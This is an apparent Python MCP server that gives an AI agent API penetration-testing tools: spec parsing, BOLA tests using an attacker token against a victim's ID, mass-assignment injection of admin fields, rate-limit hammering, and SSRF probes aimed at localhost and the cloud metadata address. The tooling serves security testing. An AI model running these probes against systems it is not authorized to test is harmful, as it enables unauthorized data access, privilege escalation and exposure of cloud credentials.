from mcp.server.fastmcp import FastMCP
import requests
import yaml
import time
from typing import Dict, Any, Optional

# Initialize the MCP Server
mcp = FastMCP("API Security Arsenal")

# Helper to handle request logic safely
def safe_request(method, url, headers=None, json=None, params=None, timeout=5):
    try:
        if method == 'GET':
            return requests.get(url, headers=headers, params=params, timeout=timeout)
        elif method == 'POST':
            return requests.post(url, headers=headers, json=json, timeout=timeout)
        elif method == 'DELETE':
            return requests.delete(url, headers=headers, timeout=timeout)
        elif method == 'PUT':
            return requests.put(url, headers=headers, json=json, timeout=timeout)
    except Exception as e:
        return None

@mcp.tool()
def parse_openapi_spec(spec_source: str) -> str:
    """
    (API9) Reads an OpenAPI spec from a URL or local file path.
    Returns a list of endpoints to test.
    """
    try:
        if spec_source.startswith("http"):
            resp = requests.get(spec_source)
            spec = yaml.safe_load(resp.text)
        else:
            with open(spec_source, 'r') as f:
                spec = yaml.safe_load(f)
        
        inventory = []
        for path, methods in spec.get('paths', {}).items():
            for method in methods.keys():
                inventory.append(f"{method.upper()} {path}")
        return "--- API INVENTORY ---\n" + "\n".join(inventory)
    except Exception as e:
        return f"Error parsing spec: {str(e)}"

@mcp.tool()
def test_bola(base_url: str, auth_token: str, endpoint: str, id_param: str, victim_id: str) -> str:
    """
    (API1) Tests for BOLA. Tries to access a Victim's ID using the provided (Attacker) token.
    args:
        base_url: e.g. "http://localhost:5000"
        auth_token: "Bearer ..."
        endpoint: e.g. "/users/{id}/data"
        id_param: e.g. "id"
        victim_id: The ID of the user we are trying to hack.
    """
    target = f"{base_url}{endpoint.replace(f'{{{id_param}}}', victim_id)}"
    headers = {"Authorization": auth_token}
    
    resp = safe_request('GET', target, headers=headers)
    
    if resp and resp.status_code == 200:
        return f"[VULNERABLE] BOLA Success! Accessed {target}. Status 200.\nSample Data: {resp.text[:100]}"
    elif resp:
        return f"[SECURE] Access denied or failed at {target}. Status: {resp.status_code}"
    return f"[ERROR] Connection failed to {target}"

@mcp.tool()
def test_mass_assignment(base_url: str, auth_token: str, endpoint: str) -> str:
    """
    (API3) Tests for Mass Assignment on POST endpoints.
    """
    url = f"{base_url}{endpoint}"
    headers = {"Authorization": auth_token}
    payload = {
        "username": "security_test",
        "email": "test@example.com",
        "is_admin": True,
        "role": "admin",
        "permissions": "root"
    }
    
    resp = safe_request('POST', url, headers=headers, json=payload)
    
    if resp:
        txt = resp.text.lower()
        if "admin" in txt and ("true" in txt or "root" in txt):
             return f"[VULNERABLE] Mass Assignment: Injected admin fields reflected in response from {endpoint}."
        return f"[SAFE] Status {resp.status_code}. Response did not reflect admin privileges."
    return "[ERROR] Connection failed."

@mcp.tool()
def test_rate_limiting(base_url: str, auth_token: str, endpoint: str, count: int = 10) -> str:
    """
    (API4) Hammers an endpoint to test for 429 Too Many Requests.
    """
    url = f"{base_url}{endpoint}"
    headers = {"Authorization": auth_token}
    status_codes = []
    
    start = time.time()
    for _ in range(count):
        try:
            r = requests.get(url, headers=headers, timeout=2)
            status_codes.append(r.status_code)
        except:
            status_codes.append(0)
            
    duration = time.time() - start
    
    if 429 in status_codes:
        return f"[SECURE] Rate Limit hit (429) detected."
    return f"[VULNERABLE] Sent {count} requests in {duration:.2f}s without being blocked."

@mcp.tool()
def test_ssrf(base_url: str, auth_token: str, endpoint: str, param_name: str) -> str:
    """
    (API7) Injects localhost/metadata URLs into GET parameters.
    """
    payloads = ["http://localhost", "http://169.254.169.254/latest/meta-data/"]
    results = []
    
    for p in payloads:
        url = f"{base_url}{endpoint}"
        headers = {"Authorization": auth_token}
        params = {param_name: p}
        
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=3)
            if resp.status_code == 200:
                results.append(f"[VULNERABLE] SSRF: {url}?{param_name}={p} returned 200 OK.")
        except:
            pass
            
    if not results:
        return "[SAFE] No SSRF behavior detected."
    return "\n".join(results)

if __name__ == "__main__":
    mcp.run(transport="stdio")